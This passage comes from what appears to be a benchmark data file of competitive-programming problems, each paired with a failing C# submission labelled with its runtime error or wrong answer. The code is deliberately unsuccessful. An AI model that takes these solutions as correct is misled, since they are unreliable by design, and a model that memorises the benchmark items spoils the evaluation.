4\u00b7105 characters. The string can contain only lowercase Latin letters ('a' - 'z') and periods ('.').","output_spec":"In the first line print \"YES\" (without the quotes), if it is possible to divide s into parts as required. In this case, the following lines should contain the parts of the required partition, one per line in the order in which they appear in s. The required partition can contain the same file names. If there are multiple solutions, print any of them. If the solution does not exist, then print in a single line \"NO\" (without the quotes).","notes":null,"sample_inputs":["read.meexample.txtb.cpp","version.infontldrcontestdata.zip"],"sample_outputs":["YES\nread.m\neexample.t\nxtb.cpp","NO"]}
{"difficulty":1100,"lang":"Mono C#","lang_cluster":"c#","src_uid":"9c90974a0bb860a5e180760042fd5045","submission_id":"re_1144","tags":["implementation","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System;\nusing System.Linq;\n\nnamespace TaskB\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            int[] nm = Console.ReadLine().Split(' ').Select(str => int.Parse(str)).ToArray();\n            int N = nm[0];\n            int M = nm[1];\n            string[] strs = new string[N];\n            for (int i = 0; i < N; i++)\n                strs[i] = Console.ReadLine();\n            bool[,] bl = new bool[N,M];\n            for (int i = 0; i < N; i++)\n                for (int j = 0; j < M; j++)\n                {\n                    string s = strs[i].Remove(j,1);\n                    if (s.Contains(strs[i][j]))\n                    {\n                        bl[i, j] = true;\n                        continue;\n                    }\n\n                    for (int k = 0; k < M; k++)\n                        if (k != i && strs[k][j] == strs[i][j])\n                        {\n                            bl[i, j] = true;\n                            continue;\n                        }\n                }\n\n            string res = string.Empty;\n            for (int i = 0; i < N; i++)\n                for (int j = 0; j < M; j++)\n                    if (!bl[i, j]) res += strs[i][j];\n            Console.WriteLine(res);\n        }\n    }\n}\n","description":"An African crossword is a rectangular table n\u2009\u00d7\u2009m in size. Each cell of the table contains exactly one letter. This table (it is also referred to as grid) contains some encrypted word that needs to be decoded.To solve the crossword you should cross out all repeated letters in rows and columns. In other words, a letter should only be crossed out if and only if the corresponding column or row contains at least one more letter that is exactly the same. Besides, all such letters are crossed out simultaneously.When all repeated letters have been crossed out, we should write the remaining letters in a string. The letters that occupy a higher position follow before the letters that occupy a lower position. If the letters are located in one row, then the letter to the left goes first. The resulting word is the answer to the problem.You are suggested to solve an African crossword and print the word encrypted there.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009100). Next n lines contain m lowercase Latin letters each. That is the crossword grid.","output_spec":"Print the encrypted word on a single line. It is guaranteed that the answer consists of at least one letter.","notes":null,"sample_inputs":["3 3\ncba\nbcd\ncbc","5 5\nfcofd\nooedo\nafaoa\nrdcdf\neofsf"],"sample_outputs":["abcd","codeforces"]}
{"difficulty":1400,"lang":"Mono C#","lang_cluster":"c#","src_uid":"a37df9b239a40473516d1525d56a0da7","submission_id":"re_1066","tags":["combinatorics"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\n\nnamespace _108c\n{\n    class Program\n    {\n        class Scanner\n        {\n            string[] s;\n            int i;\n\n            char[] cs = new char[] { ' ' };\n\n            public Scanner()\n            {\n                \/\/s = \"4 5 ABABA BCGDG AAAAA YABSA\".Split(cs, StringSplitOptions.RemoveEmptyEntries);\n                s = new string[0];\n                i = 0;\n            }\n\n            public string next()\n            {\n                if (i < s.Length) return s[i++];\n                s = Console.ReadLine().Split(cs, StringSplitOptions.RemoveEmptyEntries);\n                i = 0;\n                return s[i++];\n            }\n\n            public int nextInt()\n            {\n                return int.Parse(next());\n            }\n\n            public long nextLong()\n            {\n                return long.Parse(next());\n            }\n        }\n        static void Main(string[] args)\n        {\n            Scanner sc = new Scanner();\n            int n = sc.nextInt();\n            int m = sc.nextInt();\n\n            \n            List<char>[] lst = new List<char>[m];\n            for (int i = 0; i < m; i++)\n            {\n                lst[i] = new List<char>();\n            }\n\n            for (int i = 0; i < n; i++)\n            {\n                string s = sc.next();\n                for (int j = 0; j < m; j++)\n                {\n                    if(!lst[j].Contains(s[j]))\n                    {\n                        lst[j].Add(s[j]);\n                    }\n                }\n            }\n\n            double result = 1;\n\n            for (int i = 0; i < m; i++)\n            {\n                result *= (long)lst[i].Count;\n            }\n            result = result % 1000000007;\n            \n            Console.WriteLine((long)result);\n        }\n    }\n}\n","description":"One day little Vasya found mom's pocket book. The book had n names of her friends and unusually enough, each name was exactly m letters long. Let's number the names from 1 to n in the order in which they are written.As mom wasn't home, Vasya decided to play with names: he chose three integers i, j, k (1\u2009\u2264\u2009i\u2009&lt;\u2009j\u2009\u2264\u2009n, 1\u2009\u2264\u2009k\u2009\u2264\u2009m), then he took names number i and j and swapped their prefixes of length k. For example, if we take names \"CBDAD\" and \"AABRD\" and swap their prefixes with the length of 3, the result will be names \"AABAD\" and \"CBDRD\".You wonder how many different names Vasya can write instead of name number 1, if Vasya is allowed to perform any number of the described actions. As Vasya performs each action, he chooses numbers i, j, k independently from the previous moves and his choice is based entirely on his will. The sought number can be very large, so you should only find it modulo 1000000007 (109\u2009+\u20097).","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains two integers n and m (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009100) \u2014 the number of names and the length of each name, correspondingly. Then n lines contain names, each name consists of exactly m uppercase Latin letters.","output_spec":"Print the single number \u2014 the number of different names that could end up in position number 1 in the pocket book after the applying the procedures described above. Print the number modulo 1000000007 (109\u2009+\u20097).","notes":"NoteIn the first sample Vasya can get the following names in the position number 1: \"AAB\", \"AAA\", \"BAA\" and \"BAB\".","sample_inputs":["2 3\nAAB\nBAA","4 5\nABABA\nBCGDG\nAAAAA\nYABSA"],"sample_outputs":["4","216"]}
{"difficulty":1500,"lang":"Mono C#","lang_cluster":"c#","src_uid":"b0301a2d79a1ec126511ed769ec0b743","submission_id":"re_907","tags":["bitmasks","brute force","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\nusing System.Threading;\nusing System.Globalization;\n\nnamespace Codeforces\n{\n    class Program\n    {        \n        static int ReadInt()\n        {\n            return Int32.Parse(Console.ReadLine());\n        }\n        static long ReadLong()\n        {\n            return long.Parse(Console.ReadLine());\n        }\n        static void ReadIntArray(out int[] array, char separator = ' ')\n        {\n            var input = Console.ReadLine().Split(separator);\n            array = new int[input.Length];\n            for (int i = 0; i < input.Length; i++)\n            {\n                array[i] = Int32.Parse(input[i]);\n            }\n\n        }\n\n        static int ReadNextInt(string input, int index)\n        {\n            var ints = input.Split(' ');\n            return Int32.Parse(ints[index]);\n        }\n\n\n        static void Main()\n        {\n            var input = Console.ReadLine();\n            var n = ReadNextInt(input, 0);\n            var m = ReadNextInt(input, 1);\n\n            var players = new Dictionary<int, string>();\n            var enemies = new Dictionary<string, List<string>>();\n            for (int i = 0; i < n; i++)\n            {\n                players.Add(i, Console.ReadLine()); \n            }\n            for (int i = 0; i < m; i++)\n            {\n                var pair = Console.ReadLine().Split(' ');\n                if (!enemies.ContainsKey(pair[0]))\n                    enemies[pair[0]] = new List<string>();\n                enemies[pair[0]].Add(pair[1]);\n                if (!enemies.ContainsKey(pair[1]))\n                    enemies[pair[1]] = new List<string>();\n                enemies[pair[1]].Add(pair[0]);\n            }\n            int res = 0;\n            var resPlaers = new List<string>();\n            var maxPlayers = new List<string>();\n            int c = 1 << n;\n            int count = 0;\n            bool isGood = true;\n            while (--c > 0)\n            {\n                count = 0;\n                isGood = true;\n                resPlaers.Clear();\n                for (int i = 0; i < n; i++)\n                {\n                    if ((c & (1 << i)) == 0)\n                        continue;\n\n                    count++;\n                    resPlaers.Add(players[i]);\n\n                    for (int j = i + 1; j < n; j++)\n                    {\n                        if ((c & (1 << j)) == 0)\n                            continue;\n\n                        if (enemies.ContainsKey(players[i]) && enemies[players[i]].Contains(players[j]))\n                        {\n                            isGood = false;\n                            break;\n                        }\n                    }\n\n                    if (!isGood)\n                        break;\n                }\n                if (isGood)\n                {\n                    if (res < count)\n                    {\n                        res = count;\n                        maxPlayers.Clear();\n                        maxPlayers.AddRange(resPlaers);\n                    }\n                }\n            }\n            Console.WriteLine(res);           \n            maxPlayers.Sort(StringComparer.Create(CultureInfo.InvariantCulture, true));\n            foreach (var player in maxPlayers)\n                Console.WriteLine(player);\n        }\n    }\n}","description":"When little Petya grew up and entered the university, he started to take part in \u0410\u0421\u041c contests. Later he realized that he doesn't like how the \u0410\u0421\u041c contests are organised: the team could only have three members (and he couldn't take all his friends to the competitions and distribute the tasks between the team members efficiently), so he decided to organize his own contests PFAST Inc. \u2014 Petr and Friends Are Solving Tasks Corporation. PFAST Inc. rules allow a team to have unlimited number of members.To make this format of contests popular he organised his own tournament. To create the team he will prepare for the contest organised by the PFAST Inc. rules, he chose several volunteers (up to 16 people) and decided to compile a team from them. Petya understands perfectly that if a team has two people that don't get on well, then the team will perform poorly. Put together a team with as many players as possible given that all players should get on well with each other.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integer numbers n (1\u2009\u2264\u2009n\u2009\u2264\u200916) \u2014 the number of volunteers, and m () \u2014 the number of pairs that do not get on. Next n lines contain the volunteers' names (each name is a non-empty string consisting of no more than 10 uppercase and\/or lowercase Latin letters). Next m lines contain two names \u2014 the names of the volunteers who do not get on. The names in pair are separated with a single space. Each pair of volunteers who do not get on occurs exactly once. The strings are case-sensitive. All n names are distinct.","output_spec":"The first output line should contain the single number k \u2014 the number of people in the sought team. Next k lines should contain the names of the sought team's participants in the lexicographical order. If there are several variants to solve the problem, print any of them. Petya might not be a member of the sought team. ","notes":null,"sample_inputs":["3 1\nPetya\nVasya\nMasha\nPetya Vasya","3 0\nPasha\nLesha\nVanya"],"sample_outputs":["2\nMasha\nPetya","3\nLesha\nPasha\nVanya"]}
{"difficulty":1100,"lang":"Mono C#","lang_cluster":"c#","src_uid":"b1ef19d7027dc82d76859d64a6f43439","submission_id":"re_692","tags":["implementation","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Text;\nusing System.Collections.Generic;\nusing System.IO;\n\nnamespace codeforces_43_B\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            Console.SetIn(new StreamReader(\"input.txt\"));\n            StringBuilder letter = new StringBuilder(Console.ReadLine().Trim());\n            StringBuilder message = new StringBuilder(Console.ReadLine().Trim());\n\n            Dictionary<char, uint> dict = new Dictionary<char, uint>();\n            int i = -1;\n            while (i < letter.Length-1)\n            {\n                i++;\n                if (letter[i] == ' ')\n                    continue;\n                char curChar = letter[i];\n                if (dict.ContainsKey(curChar))\n                {\n                    dict[curChar]++;\n                }\n                else\n                {\n                    dict.Add(curChar, 0);\n                }\n            }\n            bool canWrite = true;\n            int j = -1;\n            while (j < message.Length-1)\n            {\n                j++;\n                if (message[j] == ' ')\n                    continue;\n                char curChar = message[j];\n                if (!dict.ContainsKey(curChar))\n                {\n                    canWrite = false;\n                    break;\n                }\n                else\n                {\n                    dict[curChar]--;\n                }\n            }\n            foreach (char curChar in dict.Keys)\n                if (dict[curChar] < 0)\n                {\n                    canWrite = false;\n                    break;\n                }\n            Console.Write((canWrite) ? \"YES\" : \"NO\");\n            Console.ReadKey();\n        }\n    }\n}\n","description":"Vasya decided to write an anonymous letter cutting the letters out of a newspaper heading. He knows heading s1 and text s2 that he wants to send. Vasya can use every single heading letter no more than once. Vasya doesn't have to cut the spaces out of the heading \u2014 he just leaves some blank space to mark them. Help him; find out if he will manage to compose the needed text.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a newspaper heading s1. The second line contains the letter text s2. s1 \u0438 s2 are non-empty lines consisting of spaces, uppercase and lowercase Latin letters, whose lengths do not exceed 200 symbols. The uppercase and lowercase letters should be differentiated. Vasya does not cut spaces out of the heading.","output_spec":"If Vasya can write the given anonymous letter, print YES, otherwise print NO","notes":null,"sample_inputs":["Instead of dogging Your footsteps it disappears but you dont notice anything\nwhere is your dog","Instead of dogging Your footsteps it disappears but you dont notice anything\nYour dog is upstears","Instead of dogging your footsteps it disappears but you dont notice anything\nYour dog is upstears","abcdefg hijk\nk j i h g f e d c b a"],"sample_outputs":["NO","YES","NO","YES"]}
{"difficulty":1000,"lang":"Mono C#","lang_cluster":"c#","src_uid":"bdd86c8bc54bbac6e2bb5a9d68b6eb1c","submission_id":"re_1301","tags":["greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Globalization;\nusing System.Threading;\nusing System.Collections;\nusing System.IO;\n\nnamespace AcmSolution\n{\n    internal class Program\n    {\n        private static void Main(string[] args)\n        {\n            Thread.CurrentThread.CurrentCulture = CultureInfo.InvariantCulture;\n            \/\/Console.SetIn(new StreamReader(\"gcd.in\"));\n           \/\/ Console.SetOut(new StreamWriter(\"gcd.out\"));\n            Do();\n            \/\/Console.Out.Close();\n            Console.ReadLine();\n        }\n\n        private static void Do()\n        {\n            int n = GetInt();\n            int[] a = GetInts();\n            Array.Sort(a);\n            int subNumbers = 0;\n\n            if (n == 1 && a[0] > n)\n                subNumbers = 1;\n\n            for (int i = 0; i < n; i++)\n            {\n                if (a[i]> n)\n                {\n                    subNumbers++;                   \n                }\n                else if (i > 0 && a[i] == a[i - 1])\n                    subNumbers++;\n            }\n\n            Console.WriteLine(subNumbers);\n        }\n\n        #region Utils\n        private const double Epsilon = 0.00000001;\n\n        private static string GetStr()\n        {\n            return Console.ReadLine();\n        }\n\n        private static string[] GetStrs()\n        {\n            return GetStr().Split(new[] { ' ', '\\t' }, StringSplitOptions.RemoveEmptyEntries);\n        }\n\n        private static string[] GetStrs(int cnt)\n        {\n            var s = new string[cnt];\n            for (var i = 0; i < cnt; ++i)\n                s[i] = GetStr();\n            return s;\n        }\n\n        private static int GetInt()\n        {\n            return int.Parse(GetStr());\n        }\n\n        private static void GetInts(out int a, out int b)\n        {\n            var q = GetInts();\n            a = q[0];\n            b = q[1];\n        }\n\n        private static void GetInts(out int a, out int b, out int c)\n        {\n            var q = GetInts();\n            a = q[0];\n            b = q[1];\n            c = q[2];\n        }\n\n        private static int[] GetInts()\n        {\n            var s = GetStrs();\n            var a = new int[s.Length];\n            for (var i = 0; i < s.Length; ++i)\n                a[i] = int.Parse(s[i]);\n            return a;\n        }\n\n        private static long GetLong()\n        {\n            return long.Parse(GetStr());\n        }\n\n        private static IEnumerable<long> GetLongs()\n        {\n            return GetStrs().Select(long.Parse);\n        }\n\n        private static void WriteDouble<T>(T d)\n        {\n            Console.WriteLine(string.Format(\"{0:0.000000000}\", d).Replace(',', '.'));\n        }\n\n        private static void WL<T>(T s)\n        {\n            Console.WriteLine(s);\n        }\n\n        private static void W<T>(T s)\n        {\n            Console.Write(s);\n        }\n\n        private static void Assert(bool b)\n        {\n            if (!b) throw new Exception();\n        }\n\n        private static void Swap<T>(ref T a, ref T b)\n        {\n            var temp = a;\n            a = b;\n            b = temp;\n        }\n\n        #endregion\n    }\n}","description":"\"Hey, it's homework time\" \u2014 thought Polycarpus and of course he started with his favourite subject, IT. Polycarpus managed to solve all tasks but for the last one in 20 minutes. However, as he failed to solve the last task after some considerable time, the boy asked you to help him.The sequence of n integers is called a permutation if it contains all integers from 1 to n exactly once.You are given an arbitrary sequence a1,\u2009a2,\u2009...,\u2009an containing n integers. Each integer is not less than 1 and not greater than 5000. Determine what minimum number of elements Polycarpus needs to change to get a permutation (he should not delete or add numbers). In a single change he can modify any single sequence element (i. e. replace it with another integer).","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains an integer n (1\u2009\u2264\u2009n\u2009\u2264\u20095000) which represents how many numbers are in the sequence. The second line contains a sequence of integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u20095000,\u20091\u2009\u2264\u2009i\u2009\u2264\u2009n).","output_spec":"Print the only number \u2014 the minimum number of changes needed to get the permutation.","notes":"NoteThe first sample contains the permutation, which is why no replacements are required.In the second sample it is enough to replace the first element with the number 1 and that will make the sequence the needed permutation.In the third sample we can replace the second element with number 4 and the fourth element with number 2.","sample_inputs":["3\n3 1 2","2\n2 2","5\n5 3 3 3 1"],"sample_outputs":["0","1","2"]}
{"difficulty":1200,"lang":"MS C#","lang_cluster":"c#","src_uid":"c31fed523230af1f904218b2fe0d663d","submission_id":"re_911","tags":["implementation","sortings"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\n\nnamespace \u041a\u043e\u0442\u0442\u0435\u0434\u0436\u043d\u044b\u0439_\u0433\u043e\u0440\u043e\u0434\u043e\u043a\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            string[] str = Console.ReadLine().Split(' ');\n            int n = int.Parse(str[0]), t = int.Parse(str[1]);\n            int[,] mas = new int[n,2];\n            for (int i = 0; i < n; i++)\n            {\n                str = Console.ReadLine().Split(' ');\n                mas[i, 0] = int.Parse(str[0]);\n                mas[i, 1] = int.Parse(str[1]);\n            }\n            for(int i=0;i<n-1;i++)\n                for(int j=0;j<n-i-1;j++)\n                    if (mas[j, 0] > mas[j + 1, 0])\n                    {\n                        mas[j,0] += mas[j + 1,0];\n                        mas[j, 1] += mas[j + 1, 1];\n                        mas[j + 1, 0] = mas[j, 0] - mas[j + 1, 0];\n                        mas[j + 1, 1] = mas[j, 1] - mas[j + 1, 1];\n                        mas[j, 0] -= mas[j + 1, 0];\n                        mas[j, 1] -= mas[j + 1, 1];\n                    }\n            int ans = 2;\n            for (int i = 0; i < n-1; i++)\n            {\n                if (((mas[i + 1, 0] - mas[i + 1, 1] \/ 2) - (mas[i, 0] + mas[i, 1] \/ 2)) > t)\n                    ans += 2;\n                if (((mas[i + 1, 0] - mas[i + 1, 1] \/ 2) - (mas[i, 0] + mas[i, 1] \/ 2)) == t)\n                    ans++;\n\n            }\n            Console.WriteLine(ans);\n        }\n    }\n}\n","description":"A new cottage village called \u00abFlatville\u00bb is being built in Flatland. By now they have already built in \u00abFlatville\u00bb n square houses with the centres on the \u041ex-axis. The houses' sides are parallel to the coordinate axes. It's known that no two houses overlap, but they can touch each other.The architect bureau, where Peter works, was commissioned to build a new house in \u00abFlatville\u00bb. The customer wants his future house to be on the \u041ex-axis, to be square in shape, have a side t, and touch at least one of the already built houses. For sure, its sides should be parallel to the coordinate axes, its centre should be on the Ox-axis and it shouldn't overlap any of the houses in the village.Peter was given a list of all the houses in \u00abFlatville\u00bb. Would you help him find the amount of possible positions of the new house?","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains numbers n and t (1\u2009\u2264\u2009n,\u2009t\u2009\u2264\u20091000). Then there follow n lines, each of them contains two space-separated integer numbers: xi ai, where xi \u2014 x-coordinate of the centre of the i-th house, and ai \u2014 length of its side (\u2009-\u20091000\u2009\u2264\u2009xi\u2009\u2264\u20091000, 1\u2009\u2264\u2009ai\u2009\u2264\u20091000).","output_spec":"Output the amount of possible positions of the new house.","notes":"NoteIt is possible for the x-coordinate of the new house to have non-integer value.","sample_inputs":["2 2\n0 4\n6 2","2 2\n0 4\n5 2","2 3\n0 4\n5 2"],"sample_outputs":["4","3","2"]}
{"difficulty":1200,"lang":"Mono C#","lang_cluster":"c#","src_uid":"c3244e952830643938d51ce14f043d7d","submission_id":"re_853","tags":["strings"],"exec_outcome":"WRONG_ANSWER","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\n\nnamespace Problems\n{\n    class _8A\n    {\n        public static  void  Main()\n        {\n            var forward = \"forward\";\n            var backward = \"backward\";\n            var both = \"both\";\n            var fantasy = \"fantasy\";\n            var len = 25000;\n            var stations = new string('a', len * 2) + new string('b', len*2);\n            var a = new string('a', len);\n            var b = new string('b', len);\n            \/\/var stations = Console.ReadLine();\n            \/\/var a = Console.ReadLine();\n            \/\/var b = Console.ReadLine();\n            var forw = (IsSequencePossible(stations, a, b));\n            \/\/var back = (IsSequencePossible(Reverse(stations), a, b));\n            var back = (IsRevSequencePossible(stations, a, b));\n            \n            if (forw && back)\n            {\n                Console.WriteLine(both);\n            }\n            else\n            {\n                if (forw) Console.WriteLine(forward);\n                else if (back) Console.WriteLine(backward);\n                else Console.WriteLine(fantasy);\n            }\n\n        }\n\n        private static string Reverse(string s)\n        {\n            Console.WriteLine(\" start Reverse \" + DateTime.Now.Second + \" \" + DateTime.Now.Millisecond);\n            string result = string.Empty;\n            for (int i = s.Length - 1; i >= 0; i-- )\n            {\n                result += s[i];\n            }\n            \/\/Console.WriteLine(\" end Reverse \" + DateTime.Now.Second + \" \" + DateTime.Now.Millisecond);\n            return result;\n        }\n\n        private static bool IsSequencePossible(string stations, string a, string b)\n        {\n\n            var result = false;\n            var ind = FindSubstring(stations, a);\n            if (ind > -1)\n            {\n                Console.WriteLine(\" start Substring \" + DateTime.Now.Second + \" \"+ DateTime.Now.Millisecond);\n                stations = stations.Substring(ind + a.Length);\n                Console.WriteLine(\" ebd Substring \" + DateTime.Now.Second + \" \" + DateTime.Now.Millisecond);\n                if (FindSubstring(stations, b) > -1)\n                {\n                    result = true;\n                }\n            }\n            return result;\n        }\n        private static bool IsRevSequencePossible(string stations, string a, string b)\n        {\n\n            var result = false;\n            var ind = FindRevSubstring(stations, a);\n            if (ind > -1)\n            {\n                Console.WriteLine(\" start Substring \" + DateTime.Now.Second + \" \" + DateTime.Now.Millisecond);\n                stations = stations.Substring(ind + a.Length);\n                Console.WriteLine(\" ebd Substring \" + DateTime.Now.Second + \" \" + DateTime.Now.Millisecond);\n                if (FindRevSubstring(stations, b) > -1)\n                {\n                    result = true;\n                }\n            }\n            return result;\n        }\n        private static int FindSubstring(string s, string a)\n        {\n            Console.WriteLine(\" start FindSubstring \" + DateTime.Now.Second + \" \" + DateTime.Now.Millisecond);\n            if (s.Length < a.Length) return -1;\n            ulong x = 257;\n            ulong xn = 1;\n            for (int i = 1; i < a.Length; i++)\n            {\n                xn = xn * x;\n            }\n            \n            ulong ha = 0;\n            for (int i = 0; i < a.Length; i++)\n            {\n                ha = ha * x + a[i];\n            }\n            \n            ulong hs = 0;\n            for (int i = 0; i < a.Length; i++)\n            {\n                hs = hs * x + s[i];\n            }\n            \n            if (hs == ha) return 0;\n            \n            for(int i = a.Length; i < s.Length; i++)\n            {\n                hs = (hs - xn*s[i - a.Length]) * x + s[i];\n                if (hs == ha) return i-a.Length+1;\n            }\n\n            return -1;\n        }\n\n        private static int FindRevSubstring(string s, string a)\n        {\n            Console.WriteLine(\" start FindSubstring \" + DateTime.Now.Second + \" \" + DateTime.Now.Millisecond);\n            if (s.Length < a.Length) return -1;\n            ulong x = 257;\n            ulong xn = 1;\n            for (int i = 1; i < a.Length; i++)\n            {\n                xn = xn * x;\n            }\n\n            ulong ha = 0;\n            for (int i = 0; i < a.Length; i++)\n            {\n                ha = ha * x + a[i];\n            }\n\n            ulong hs = 0;\n            for (int i = s.Length-1; i >= 0 ; i--)\n            {\n                hs = hs * x + s[i];\n            }\n\n            if (hs == ha) return 0;\n\n            for (int i = s.Length-1-a.Length; i >= 0; i--)\n            {\n                hs = (hs - xn * s[i + a.Length]) * x + s[i];\n                if (hs == ha) return i + a.Length - 1;\n            }\n\n            return -1;\n        }\n    }\n}\n","description":"Peter likes to travel by train. He likes it so much that on the train he falls asleep. Once in summer Peter was going by train from city A to city B, and as usual, was sleeping. Then he woke up, started to look through the window and noticed that every railway station has a flag of a particular colour.The boy started to memorize the order of the flags' colours that he had seen. But soon he fell asleep again. Unfortunately, he didn't sleep long, he woke up and went on memorizing the colours. Then he fell asleep again, and that time he slept till the end of the journey.At the station he told his parents about what he was doing, and wrote two sequences of the colours that he had seen before and after his sleep, respectively.Peter's parents know that their son likes to fantasize. They give you the list of the flags' colours at the stations that the train passes sequentially on the way from A to B, and ask you to find out if Peter could see those sequences on the way from A to B, or from B to A. Remember, please, that Peter had two periods of wakefulness.Peter's parents put lowercase Latin letters for colours. The same letter stands for the same colour, different letters \u2014 for different colours.","input_from":"standard input","output_to":"standard output","input_spec":"The input data contains three lines. The first line contains a non-empty string, whose length does not exceed 105, the string consists of lowercase Latin letters \u2014 the flags' colours at the stations on the way from A to B. On the way from B to A the train passes the same stations, but in reverse order.  The second line contains the sequence, written by Peter during the first period of wakefulness. The third line contains the sequence, written during the second period of wakefulness. Both sequences are non-empty, consist of lowercase Latin letters, and the length of each does not exceed 100 letters. Each of the sequences is written in chronological order. ","output_spec":"Output one of the four words without inverted commas:    \u00abforward\u00bb \u2014 if Peter could see such sequences only on the way from A to B;  \u00abbackward\u00bb \u2014 if Peter could see such sequences on the way from B to A;  \u00abboth\u00bb \u2014 if Peter could see such sequences both on the way from A to B, and on the way from B to A;  \u00abfantasy\u00bb \u2014 if Peter could not see such sequences. ","notes":"NoteIt is assumed that the train moves all the time, so one flag cannot be seen twice. There are no flags at stations A and B.","sample_inputs":["atob\na\nb","aaacaaa\naca\naa"],"sample_outputs":["forward","both"]}
{"difficulty":1200,"lang":"MS C#","lang_cluster":"c#","src_uid":"cb4dbff31d967c3dab8fe0495eb871dc","submission_id":"re_17","tags":["dsu","dfs and similar","brute force","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\nusing System.Threading.Tasks;\n\nnamespace _217A\n{\n    class Struct\n    {\n        public Struct(int x1, int y1, int set1)\n        {\n\n            \n            x = x1;\n            y = y1;\n            set = set1;\n        }\n        public int x;\n        public int y;\n        public int set;\n\n        public override string ToString()\n        {\n            return x + \" \" + y + \" \" + set;\n        }\n    }\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            int n = int.Parse(Console.ReadLine());\n            var list = new List<Struct>();\n\n            int id = 0;\n\n            for (int i = 0; i < n; i++)\n            {\n                \/\/Console.WriteLine(\"\u0422\u043e\u0447\u043a\u0430 \u2116\"+i);\n                var strArr = Console.ReadLine().Split(' ');\n                int x = int.Parse(strArr[0]);\n                int y = int.Parse(strArr[1]);\n                var setValue = list.Where(s => s.x == x ^ s.y == y).Select(s => s.set);\n                var setElems = list.Where(s => setValue.Contains(s.set));\n                foreach (var item in setElems)\n                {\n                    item.set = id;\n                }\n                list.Add(new Struct(x, y, id));\n                id++;\n                \/\/foreach (var item in list)\n                \/\/{\n                \/\/    Console.WriteLine(item.ToString());\n                \/\/}\n            }\n            Console.WriteLine(list.Select(s=>s.set).Distinct().Count()-1);\n        }\n    }\n}\n","description":"Bajtek is learning to skate on ice. He's a beginner, so his only mode of transportation is pushing off from a snow drift to the north, east, south or west and sliding until he lands in another snow drift. He has noticed that in this way it's impossible to get from some snow drifts to some other by any sequence of moves. He now wants to heap up some additional snow drifts, so that he can get from any snow drift to any other one. He asked you to find the minimal number of snow drifts that need to be created.We assume that Bajtek can only heap up snow drifts at integer coordinates.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of input contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of snow drifts. Each of the following n lines contains two integers xi and yi (1\u2009\u2264\u2009xi,\u2009yi\u2009\u2264\u20091000) \u2014 the coordinates of the i-th snow drift. Note that the north direction coin\u0441ides with the direction of Oy axis, so the east direction coin\u0441ides with the direction of the Ox axis. All snow drift's locations are distinct.","output_spec":"Output the minimal number of snow drifts that need to be created in order for Bajtek to be able to reach any snow drift from any other one.","notes":null,"sample_inputs":["2\n2 1\n1 2","2\n2 1\n4 1"],"sample_outputs":["1","0"]}
{"difficulty":1100,"lang":"MS C#","lang_cluster":"c#","src_uid":"d526af933b5afe9abfdf9815e9664144","submission_id":"re_1224","tags":["implementation","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\n\nnamespace _192B\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            int n = Convert.ToInt32(Console.ReadLine());\n            int[] k = Console.ReadLine().Split(' ').Select(int.Parse).ToArray();\n\n            int countDay = 0;\n            int countTile = 0;\n                while (countTile <= n)\n                {\n                    if (countTile == n - 1)\n                    {\n                        countDay++;\n                        countTile = 0;\n                    }\n\n                    if (k[0] > countDay && countTile + 2 < n && k[countTile + 2] > countDay)\n                        countTile += 2;\n                    else if (k[0] > countDay && countTile + 1 < n && k[countTile + 1] > countDay)\n                        countTile += 1;\n                    else if (n == 1)\n                        continue;\n                    else\n                        break;\n                    }\n                \n                Console.WriteLine(countDay);\n            }\n        }\n    }\n\n","description":"In Berland the opposition is going to arrange mass walking on the boulevard. The boulevard consists of n tiles that are lain in a row and are numbered from 1 to n from right to left. The opposition should start walking on the tile number 1 and the finish on the tile number n. During the walk it is allowed to move from right to left between adjacent tiles in a row, and jump over a tile. More formally, if you are standing on the tile number i (i\u2009&lt;\u2009n\u2009-\u20091), you can reach the tiles number i\u2009+\u20091 or the tile number i\u2009+\u20092 from it (if you stand on the tile number n\u2009-\u20091, you can only reach tile number n). We can assume that all the opposition movements occur instantaneously.In order to thwart an opposition rally, the Berland bloody regime organized the rain. The tiles on the boulevard are of poor quality and they are rapidly destroyed in the rain. We know that the i-th tile is destroyed after ai days of rain (on day ai tile isn't destroyed yet, and on day ai\u2009+\u20091 it is already destroyed). Of course, no one is allowed to walk on the destroyed tiles! So the walk of the opposition is considered thwarted, if either the tile number 1 is broken, or the tile number n is broken, or it is impossible to reach the tile number n from the tile number 1 if we can walk on undestroyed tiles.The opposition wants to gather more supporters for their walk. Therefore, the more time they have to pack, the better. Help the opposition to calculate how much time they still have and tell us for how many days the walk from the tile number 1 to the tile number n will be possible.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009103) \u2014 the boulevard's length in tiles. The second line contains n space-separated integers ai 